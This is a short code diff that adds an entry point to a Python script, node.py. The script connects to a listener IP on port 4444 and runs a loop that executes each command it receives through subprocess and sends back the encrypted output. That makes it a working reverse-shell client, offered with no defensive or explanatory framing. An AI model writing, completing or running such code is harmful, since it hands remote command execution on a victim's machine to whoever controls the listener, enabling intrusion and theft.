@@ -14,3 +14,14 @@ def shell_loop(sock):
             break
         result = subprocess.getoutput(cmd) # Execute the command and get the output
         sock.send(encrypt(result.encode())) # Encrypt and send the result back to the server
+
+if __name__ == "__main__":
+    import sys
+    if len(sys.argv) != 2:
+        print("Usage: python node.py <listener_ip>")
+        sys.exit(1)
+
+    host = sys.argv[1]
+    port = 4444
+    sock = connect_to_server(host, port)
+    shell_loop(sock)
